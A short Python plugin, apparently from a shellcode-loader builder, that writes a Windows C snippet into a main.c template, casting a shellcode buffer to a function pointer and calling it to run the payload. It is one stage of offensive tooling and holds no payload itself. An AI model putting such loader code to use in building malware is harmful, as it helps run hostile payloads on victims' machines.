def desc():
    return "Use a local function pointer to run the payload"

def run():
    execution = '''\
    typedef VOID (WINAPI* fnShellcodefunc)();
    fnShellcodefunc pShell = (fnShellcodefunc) pShellcode;
    pShell();
'''
    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{EXECUTION}}", execution)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)
    
    return